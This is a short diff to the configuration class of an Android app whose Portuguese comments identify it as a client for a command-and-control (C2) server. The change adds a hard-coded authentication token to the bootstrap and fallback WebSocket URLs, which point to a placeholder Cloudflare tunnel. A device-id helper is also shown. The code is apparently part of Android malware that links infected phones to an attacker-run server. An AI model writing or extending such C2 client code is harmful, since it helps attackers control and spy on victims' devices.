@@ -5,10 +5,10 @@ import android.content.Context;
 import java.util.Random;
 
 public final class Cfg {
-    // Servidor de configuraÃƒÂ§ÃƒÂ£o remoto: primeira linha = URL wss:// do C2
-    public static final String BOOTSTRAP = "https://seu-tunel-aqui.trycloudflare.com/ws";
-    // Fallback embutido, usado se o bootstrap falhar
-    public static final String FALLBACK = "wss://seu-tunel-aqui.trycloudflare.com/ws";
+    // primeira linha do bootstrap = URL wss:// do C2 (com token)
+    public static final String TOKEN = "3f7cm0ygvhr5w8";
+    public static final String BOOTSTRAP = "https://seu-tunel-aqui.trycloudflare.com/ws?t=3f7cm0ygvhr5w8";
+    public static final String FALLBACK = "wss://seu-tunel-aqui.trycloudflare.com/ws?t=3f7cm0ygvhr5w8";
 
     public static String id(Context c) {
         String s = c.getSharedPreferences("p", 0).getString("id", null);
